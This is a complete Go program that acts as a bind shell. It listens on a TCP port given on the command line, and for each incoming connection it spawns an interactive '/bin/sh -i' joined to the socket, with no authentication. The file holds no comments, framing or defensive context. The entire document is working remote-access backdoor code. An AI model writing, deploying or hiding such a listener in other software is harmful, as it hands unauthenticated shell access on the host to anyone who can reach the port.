package main

import (
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"strconv"
)

func handle(conn net.Conn) {
	defer conn.Close()
	cmd := exec.Command("/bin/sh", "-i")

	rp, wp := io.Pipe()

	cmd.Stdin = conn
	cmd.Stdout = wp
	cmd.Stderr = wp

	go io.Copy(conn, rp)

	cmd.Run()
}

func main() {
	argsWithoutProg := os.Args[1:]

	if len(argsWithoutProg) < 1 || len(argsWithoutProg) > 1 {
		os.Exit(1)
	}

	port, err := strconv.Atoi(argsWithoutProg[0])
	if err != nil {
		os.Exit(1)
	}

	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", port))

	if err != nil {
		os.Exit(1)
	}

	for {
		conn, err := listener.Accept()
		if err == nil {
			go handle(conn)
		}
	}
}
